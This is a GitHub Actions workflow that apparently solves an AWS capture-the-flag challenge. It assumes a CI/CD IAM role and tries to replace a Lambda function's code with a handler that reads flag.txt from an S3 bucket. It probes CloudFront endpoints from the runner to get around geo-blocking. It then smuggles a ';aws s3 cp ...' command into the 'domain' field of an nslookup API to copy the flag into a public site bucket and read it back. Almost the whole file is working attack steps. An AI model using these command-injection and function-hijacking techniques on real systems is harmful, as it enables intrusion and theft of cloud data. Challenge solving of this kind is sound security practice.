name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Try UpdateFunctionCode with flag-returning Lambda
        run: |
          mkdir -p /tmp/lsrc
          printf '%s\n' \
            'import boto3' \
            'def lambda_handler(event, context):' \
            '    try:' \
            '        s3 = boto3.client("s3", region_name="us-east-1")' \
            '        obj = s3.get_object(Bucket="codec4f26c862a321ef5", Key="flag.txt")' \
            '        flag = obj["Body"].read().decode("utf-8")' \
            '    except Exception as e:' \
            '        flag = "s3 error: " + str(e)' \
            '    return flag' \
            > /tmp/lsrc/lambda_function.py
          cat /tmp/lsrc/lambda_function.py
          cd /tmp/lsrc && zip /tmp/payload.zip lambda_function.py
          aws lambda update-function-code \
            --function-name nslookupv2 \
            --zip-file fileb:///tmp/payload.zip \
            --region us-east-1 && echo "UPDATE OK" || echo "UpdateFunctionCode: denied"

      - name: Wait for update to propagate
        run: sleep 8

      - name: Hit API after update
        run: |
          curl -si -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":"x"}'

      - name: Probe CloudFront paths from runner (not geo-blocked like your browser)
        run: |
          echo "===== GET / ====="
          curl -si https://d67nf28gqfurd.cloudfront.net/ | head -30
          echo "===== POST /nslookup ====="
          curl -si -X POST https://d67nf28gqfurd.cloudfront.net/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":"example.com"}'

      - name: Inject - write flag to site bucket then read via cicdRole
        run: |
          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1"}'
          sleep 8
          echo "===== read back via cicdRole ====="
          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "denied"
          echo "===== read via CloudFront from runner ====="
          curl -si https://d67nf28gqfurd.cloudfront.net/flag.txt
